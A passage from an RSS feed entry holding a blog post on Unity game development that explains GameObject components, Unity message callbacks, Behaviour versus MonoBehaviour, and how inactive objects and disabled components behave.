      <a href="https://blog.eyas.sh/static/41c92cdb181e4f59a48f0c5f98958105/58ad8/ramin-khatibi-unsplash-bottom.jpg" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://blog.eyas.sh/static/41c92cdb181e4f59a48f0c5f98958105/28a80/ramin-khatibi-unsplash-bottom.webp 400w,https://blog.eyas.sh/static/41c92cdb181e4f59a48f0c5f98958105/8d2ea/ramin-khatibi-unsplash-bottom.webp 800w,https://blog.eyas.sh/static/41c92cdb181e4f59a48f0c5f98958105/43d96/ramin-khatibi-unsplash-bottom.webp 1600w,https://blog.eyas.sh/static/41c92cdb181e4f59a48f0c5f98958105/4293a/ramin-khatibi-unsplash-bottom.webp 2400w,https://blog.eyas.sh/static/41c92cdb181e4f59a48f0c5f98958105/88d9d/ramin-khatibi-unsplash-bottom.webp 3024w" sizes="(max-width: 1600px) 100vw, 1600px" type="image/webp">
        <source srcset="https://blog.eyas.sh/static/41c92cdb181e4f59a48f0c5f98958105/4cda9/ramin-khatibi-unsplash-bottom.jpg 400w,https://blog.eyas.sh/static/41c92cdb181e4f59a48f0c5f98958105/c60e9/ramin-khatibi-unsplash-bottom.jpg 800w,https://blog.eyas.sh/static/41c92cdb181e4f59a48f0c5f98958105/56dca/ramin-khatibi-unsplash-bottom.jpg 1600w,https://blog.eyas.sh/static/41c92cdb181e4f59a48f0c5f98958105/111a0/ramin-khatibi-unsplash-bottom.jpg 2400w,https://blog.eyas.sh/static/41c92cdb181e4f59a48f0c5f98958105/58ad8/ramin-khatibi-unsplash-bottom.jpg 3024w" sizes="(max-width: 1600px) 100vw, 1600px" type="image/jpeg">
        <img src="https://blog.eyas.sh/static/41c92cdb181e4f59a48f0c5f98958105/56dca/ramin-khatibi-unsplash-bottom.jpg" alt="Photo of a Building Structure" title="Photo of a Building Structure" loading="lazy">
      </picture>
  </a>
    </span></p><figcaption><p>Photo by <a href="https://unsplash.com/@raminix">Ramin Khatibi</a> via Unsplash.</p></figcaption></figure><h2 id="component">Component</h2><p>Every behavior on a GameObject is driven through its Components.
User-implemented Components will usually extend the <code>MonoBehaviour</code> subclass
(more on that later).</p><p>A Component inherits a name and instance ID from its parent. Otherwise,
conceptually, a Component</p><ul><li>always <em>belongs</em> to a single GameObject, exposed as a public
<code>GameObject gameObject</code> property, and</li><li>can receive <strong>messages</strong>, driving much of its behavior.</li></ul><p>The state of a component on an <em>active</em> GameObject lies entirely in its
implementation.</p><p>In addition to its <code>GameObject</code>, a component exposes shorthand properties and
methods such as <code>Transform transform</code>, <code>T GetComponent&lt;T&gt;()</code>, etc. These are
simply convenience shorthands for accessing those same methods on the
corresponding <code>gameObject</code>.</p><p>The most important functionality of a Component is driven through <strong>Unity
Messages</strong> (also sometimes called <em>Unity Event Functions</em> when referring to
built-in messages). These are effectively callbacks functions triggered <em>by the
Engine</em> in certain situations. Every Component will receive a <code>Awake()</code>,
<code>Start()</code>, <code>Update()</code> and other messages, for example. The Unity Docs on the
<a href="https://docs.unity3d.com/Manual/ExecutionOrder.html">Order of Execution</a> of
these messages is a convenient resource.</p><p>To have your component receive a particular message, simply add a
<em><code>private void</code></em> method with the appropriate message name. The runtime will use
reflection to call these messages, when applicable. This is why you don’t see an
<code>override</code> directive on these messages. Messages like <code>Update</code>, <code>LateUpdate</code>,
and <code>FixedUpdate</code> are inspected once per type, so don’t worry about reflection
being used in every frame. See more details in the
”<a href="https://blogs.unity3d.com/2015/12/23/1k-update-calls/">10000 Update() calls</a>”
Unity blog post for more information.</p><p>A <strong><code>Behaviour</code></strong> is a type of component that <em>can be enabled or disabled</em>. When
a <code>Behaviour</code> is disabled, <code>Start</code>, <code>Update</code>, <code>FixedUpdate</code>, <code>LateUpdate</code>,
<code>OnEnable</code>, and <code>OnDisable</code> messages are not called.</p><p>A <strong><code>MonoBehaviour</code></strong> is a <code>Behaviour</code> that also enables using
<a href="https://docs.unity3d.com/Manual/Coroutines.html">Coroutines</a>.</p><h2>A Note on Inactive Objects and Disabled Components</h2><p>A GameObject in a loaded scene will exist in memory until the object is
<em>Destroyed</em> explicitly or the scene is unloaded. A GameObject can be set to
<em>inactive</em>, which will cause it to stop receiving <code>Update</code> (and related) events.</p><p><strong>When an object is <em>created</em></strong>, the messages called on a component depend on
if: (1) the GameObject is active, and (2) the component is enabled:</p><table><thead><tr><th></th><th>GameObject is <em>active</em></th><th>GameObject is <em>inactive</em></th></tr></thead><tbody><tr><td>Component is Enabled</td><td><code>Awake</code>, <code>OnEnable</code>, <code>Start</code></td><td><em>Component implicitly disabled</em></td></tr><tr><td>Component is Disabled</td><td><code>Awake</code></td><td><code>Awake</code></td></tr></tbody></table><p><strong>When an object is <em>set to active</em> or a <code>Behaviour</code> is <em>set to enabled</em></strong>:</p><ul><li><code>OnEnable</code> will be called.</li><li>If <code>Start</code> has never been called on this <code>Behaviour</code>, it will be called
exactly once.</li></ul><h2 id="takeaways">Takeaways</h2><p>Some takeaways of all this:</p><ol><li>A Unity object might <em>appear to become <code>null</code></em> when destroyed. <code>== null</code>
checking does more than you think.</li><li>As a result, null-coalescing operators (<code>??</code>, <code>??=</code>) and null-conditional
operators (<code>?.</code>, <code>?[]</code>) don’t work as expected.</li><li>Yes, your Unity Messages can be private!</li><li>Don’t create abstract classes that unnecessarily declare <code>Update</code> or other
messages to make overriding easier; that’ll result in the engine always
calling these events.</li><li>Disabling an Object or Component is a great way to limit its game logic or
save on CPU-bound effort, but these objects still have a memory overhead.</li></ol></div></div>]]>
            </description>
            <link>https://blog.eyas.sh/2020/10/unity-for-engineers-pt5-object-component/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24891684</guid>
            <pubDate>Mon, 26 Oct 2020 00:49:40 GMT</pubDate>
        </item>
    </channel>
</rss>
